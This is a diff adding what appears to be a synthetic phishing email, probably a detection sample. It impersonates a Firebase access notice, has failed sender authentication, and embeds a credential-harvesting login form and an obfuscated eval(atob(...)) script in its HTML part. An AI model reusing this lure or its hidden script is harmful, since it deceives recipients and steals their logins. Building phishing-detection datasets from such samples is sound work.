@@ -1,0 +1,35 @@
+From: notice@firebase-auth.firebaseapp.com
+To: victim8@example.com
+Subject: Access notice from Support [ref FBC5304]
+Date: Tue, 05 Mar 2002 20:14:00 -0500
+Message-ID: <phish-68-6002e808-c433-4542-be9d-e8927c990400@firebase-auth.firebaseapp.com>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 14 Mar 2002 08:24:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 18 Mar 2002 04:51:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 18 Mar 2002 15:26:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 25 Mar 2002 15:54:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 17 Mar 2002 08:07:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 02 Mar 2002 15:50:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 14 Mar 2002 03:36:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 10 Mar 2002 04:10:00 -0500
+Return-Path: <bounce@mail-fb51f00d.top>
+Reply-To: recovery8@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-fb51f00d.top; dkim=fail header.d=firebase-auth.firebaseapp.com; dmarc=fail header.from=firebase-auth.firebaseapp.com
+Received-SPF: fail (mx.example.com: domain of notice@firebase-auth.firebaseapp.com does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=firebase-auth.firebaseapp.com; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-68-f38fb8f2"
+
+--bnd-p-68-f38fb8f2
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.firebase-auth.firebaseapp.com/auth?t=FBC5304
+
+Reference: FBC5304
+--bnd-p-68-f38fb8f2
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.firebase-auth.firebaseapp.com/auth?t=FBC5304<br/><br/>Reference: FBC5304</p><p><a href="http://firebase-auth.firebaseapp.com/login">https://www.example.com/signin</a></p><form action="http://firebase-auth.firebaseapp.com/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-68-f38fb8f2--
